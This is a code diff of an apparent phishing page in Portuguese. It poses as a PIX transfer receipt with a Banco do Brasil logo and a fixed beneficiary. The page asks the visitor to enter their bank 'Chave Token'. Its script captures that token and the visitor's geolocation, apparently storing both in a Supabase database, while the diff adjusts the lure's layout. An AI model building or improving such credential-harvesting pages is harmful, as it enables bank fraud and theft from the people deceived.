@@ -13,13 +13,13 @@
     <h2>Comprovante de Transação PIX</h2>
     
     <img id="logo" src="assets/bblogo.png" alt="Logo" width="300">
-    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante. Após clique em PERMITIR para gerar a contrasenha.</p>
+    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante.<br>Após clique em PERMITIR para gerar a contrasenha.</p>
     <p id="dados"></p>
-    
+    <!-- <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()"> -->
     <input type="text" id="password" placeholder="Chave Token" >
     <button onclick="checkAndSend()">GERAR CONTRASENHA</button>
 
-    <img id="imagem" src="assets/comprovante_desfocado.png" alt="Comprovante" width="200">
+    <!-- <img id="imagem" src="assets/comprovante_desfocado.png" alt="Comprovante" width="200"> -->
 
     <script>
         // Configuração do Supabase
@@ -28,7 +28,6 @@
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // Nome fixo para validação
-        //<input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
         //const NOME_FIXO = "Renato Tadeu Pereira";
         document.getElementById("dados").innerText = "Nome: Renato Tadeu Pereira\nBanco: SICOOB\nValor: 1000,00";
         
@@ -82,7 +81,7 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            document.getElementById("imagem").src = "assets/comprovante.png";
+            //document.getElementById("imagem").src = "assets/comprovante.png";
 
             try {
                 const { data, error } = await supabase
